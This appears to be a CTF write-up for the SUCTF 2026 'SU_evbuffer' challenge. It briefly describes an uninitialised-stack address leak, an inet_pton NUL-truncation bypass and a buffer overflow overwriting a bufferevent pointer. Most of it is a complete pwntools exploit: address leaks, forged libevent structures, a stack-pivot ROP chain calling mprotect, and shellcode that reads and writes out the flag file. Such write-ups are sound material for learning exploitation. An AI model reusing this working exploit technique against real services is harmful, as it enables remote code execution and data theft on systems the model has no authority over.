# suctf-2026_SU_evbuffer__writeup

 gethostname存在栈未初始化，导致地址泄漏

```
gethostname(local_hostname, sizeof(local_hostname));
memcpy(resp->hostname, local_hostname, sizeof(resp->hostname));
```

inet_pton检测ip不可靠，存在\x00截断

```
inet_pton(AF_INET, temp_recv, &sin->sin_addr)
```

s->user_buf存在溢出，导致s->bev被覆盖

```
memcpy(s->user_buf, temp_recv, n);

        if (s->type == PROTO_TCP && s->bev) {
            struct evbuffer *output = bufferevent_get_output(s->bev);
```

最终在add_reference中存在任意函数执行

通过伪造多个bufferevent绕过check，最终实现栈迁移rop

```python
from pwn import*
udp = remote("127.0.0.1", 8889, typ='udp')
tcp = remote("127.0.0.1", 8888, typ='tcp')
context(arch="amd64", os="linux", log_level='debug')

tcp.send(b"1.1.1.1")
tcp_response = tcp.recv(0x50)

heap = u64(tcp_response[0x28:0x30])
success("heap: " + hex(heap))
libc_base = u64(tcp_response[0x48:0x50]) - 0x25cb1a
success("libc_base: " + hex(libc_base))

udp.send(b"1.1.1.1")
udp_response = udp.recv(0x50)

pie = u64(udp_response[0x48:0x50]) - 0x1619
success("pie: " + hex(pie))
stack = u64(udp_response[0x40:0x48]) - 0x3a0
success("stack: " + hex(stack))

pop_rsp = libc_base + 0x109d1e	# pop rsp ; or eax, 0x12ae800 ; jmp qword ptr [rsi + 0x2e]
push_rsi = libc_base + 0x172b76	# push rsi ; cmp bh, ah ; jmp qword ptr [rsi + 0xf]
add_rsp = libc_base + 0x5a44e	# add rsp, 0x38 ; ret

pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9

open64 = libc_base + 0x114560
read = libc_base + 0x114850
write = libc_base + 0x1148F0
mprotect = libc_base + 0x11EB20

bufferevent_address = stack
bufferevent_output_address = bufferevent_address + 0x120
bufferevent_output_callback_address = bufferevent_output_address + 0x80
evbuffer_chain_address = bufferevent_output_callback_address + 0x28
evbuffer_chain_content_address = evbuffer_chain_address + 0x8
stack_pivot_trampoline_address = evbuffer_chain_content_address + 0x20
shellcode_address = stack_pivot_trampoline_address + 0x80

bufferevent_struct = b"\x00" * 0x118
bufferevent_struct += p64(bufferevent_output_address)

bufferevent_output_struct = b""
bufferevent_output_struct += p64(0)
bufferevent_output_struct += p64(0)
bufferevent_output_struct += p64(evbuffer_chain_address)
bufferevent_output_struct = bufferevent_output_struct.ljust(0x20, b"\x00")
bufferevent_output_struct += p64(1)
bufferevent_output_struct += p64(stack_pivot_trampoline_address + 1)
bufferevent_output_struct = bufferevent_output_struct.ljust(0x78, b"\x00")
bufferevent_output_struct += p64(bufferevent_output_callback_address)

bufferevent_output_callback_struct=b""
bufferevent_output_callback_struct+=p64(0)
bufferevent_output_callback_struct+=p64(0)
bufferevent_output_callback_struct+=p64(push_rsi)
bufferevent_output_callback_struct+=p64(0)
bufferevent_output_callback_struct+=p64(0x40001)

evbuffer_chain_struct=b""
evbuffer_chain_struct+=p64(evbuffer_chain_content_address)

evbuffer_chain_content_struct=b""
evbuffer_chain_content_struct+=p64(0)
evbuffer_chain_content_struct=evbuffer_chain_content_struct.ljust(0x18, b"\x00")
evbuffer_chain_content_struct+=p64(1)

stack_pivot_trampoline=b""
stack_pivot_trampoline=stack_pivot_trampoline.ljust(0xF, b"\x00")
stack_pivot_trampoline+=p64(pop_rsp)
stack_pivot_trampoline=stack_pivot_trampoline.ljust(0x2e, b"\x00")
stack_pivot_trampoline+=p64(add_rsp)
stack_pivot_trampoline=stack_pivot_trampoline.ljust(0x38, b"\x00")
stack_pivot_trampoline+=p64(pop_rdi) + p64(stack_pivot_trampoline_address & ~0xFFF) + p64(pop_rsi) + p64(0x2000) + p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(mprotect)
stack_pivot_trampoline+=p64(shellcode_address)

shellcode = asm(
		"""
			push	0x67616c66
			mov	rdi,	rsp
			xor	rsi,	rsi
			mov	eax,	0x2
			syscall
			mov	rdi,	rax
			mov	rsi,	rsp
			mov	edx,	0x50
			xor	rax,	rax
			syscall
			mov	rdi,	8
			mov	eax,	0x1
			syscall
		""")

payload = b""
payload += b"1.1.1.1".ljust(0x20, b"\x00")
payload += p64(1)
payload += p64(bufferevent_address)
payload += bufferevent_struct
payload += bufferevent_output_struct
payload += bufferevent_output_callback_struct
payload += evbuffer_chain_struct
payload += evbuffer_chain_content_struct
payload += stack_pivot_trampoline
payload += shellcode

udp.send(payload)

tcp.interactive()
```

